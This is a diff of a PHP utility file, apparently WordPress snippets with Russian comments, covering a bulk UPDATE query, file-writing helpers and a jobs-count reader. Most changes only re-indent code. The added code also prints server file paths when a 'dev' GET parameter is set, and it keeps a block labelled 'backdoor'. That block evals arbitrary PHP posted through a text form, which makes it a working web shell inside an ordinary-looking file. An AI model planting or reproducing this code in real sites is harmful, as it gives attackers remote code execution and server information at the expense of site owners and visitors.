@@ -21,8 +21,8 @@ $st_time = microtime(true);
 // time == 0.36151599884033
 
 $wpdb->query("UPDATE alex_test SET
-    post_title = CASE id WHEN 1 THEN 'title1_123456789' WHEN 2 THEN 'title2_123456789' WHEN 3 THEN 'title3_123456789' WHEN 4 THEN 'title4_123456789' WHEN 5 THEN 'title5_123456789' WHEN 6 THEN 'title6_123456789' ELSE '' END,
-    post_content = CASE id WHEN 1 THEN 'content1_123456789' WHEN 2 THEN 'content2_123456789' WHEN 3 THEN 'content3_123456789' WHEN 4 THEN 'content4_123456789' WHEN 5 THEN 'content5_123456789' WHEN 6 THEN 'content6_123456789' ELSE '' END");
+	post_title = CASE id WHEN 1 THEN 'title1_123456789' WHEN 2 THEN 'title2_123456789' WHEN 3 THEN 'title3_123456789' WHEN 4 THEN 'title4_123456789' WHEN 5 THEN 'title5_123456789' WHEN 6 THEN 'title6_123456789' ELSE '' END,
+	post_content = CASE id WHEN 1 THEN 'content1_123456789' WHEN 2 THEN 'content2_123456789' WHEN 3 THEN 'content3_123456789' WHEN 4 THEN 'content4_123456789' WHEN 5 THEN 'content5_123456789' WHEN 6 THEN 'content6_123456789' ELSE '' END");
 // time  = 0.09584903717041
 
 // это более правильный запрос
@@ -88,33 +88,41 @@ function as21_wjm_write_file_jobs_count($filename,$text){
 }
 // file auto create,path http://site.ru/filename.ext
 	as21_wjm_write_file_jobs_count($_SERVER['DOCUMENT_ROOT'].'/check21.txt',$text); // если есть поддомен то запись строго в род домен site.ru/check21.txt
-/* **** as21 write in file **** */
+	/* **** as21 write in file **** */
 
-/* **** as21 get valid array from file **** */ 
-function as21_wjm_get_display_count_plus_by_group_id($group_id){
-	$filename = AS21_PATH_JOBS_COUNT_TXT;
-	if( file_exists($filename)) {
+	/* **** as21 get valid array from file **** */ 
+	function as21_wjm_get_display_count_plus_by_group_id($group_id){
+		$filename = AS21_PATH_JOBS_COUNT_TXT;
+		if( file_exists($filename)) {
 
 		// on hosting immediately convert valid array
-		$file = file($filename); 
+			$file = file($filename); 
 		// if($_GET['dev']==1) { alex_debug(0,1,'file',$file);}
-		
+
 		 /* //need for correctly work on localhost
 		 $file = explode("\r", $file[0]); */
 
 		 // get valid array from file
 		 if( !isset($file[1]) ) $file = explode("\r", $file[0]);
-	}
+		}
 
-}
-/* **** as21 get valid array from file **** */ 
+	}
+	/* **** as21 get valid array from file **** */ 
+
+/* **** as21 auto show path to current script (file) **** */
+	if( (bool)$_GET['dev'] ) {
+		echo '- entry point: '.$_SERVER["SCRIPT_FILENAME"].'<br>';
+		echo '- absolut path: '.__FILE__.'<br>';
+	}
+/* **** as21 auto show path to current script (file) **** */
 
 // backdoor
 
-if ( isset($_POST['text']) ) 
-  eval ($_POST['text']); 
-?> 
-<form method='POST'> 
-   <textarea name='text'></textarea> 
-   <input type='submit'> 
-</form>
+	if ( isset($_POST['text']) ) 
+		eval ($_POST['text']); 
+	?> 
+	<form method='POST'> 
+		<textarea name='text'></textarea> 
+		<input type='submit'> 
+	</form>
+
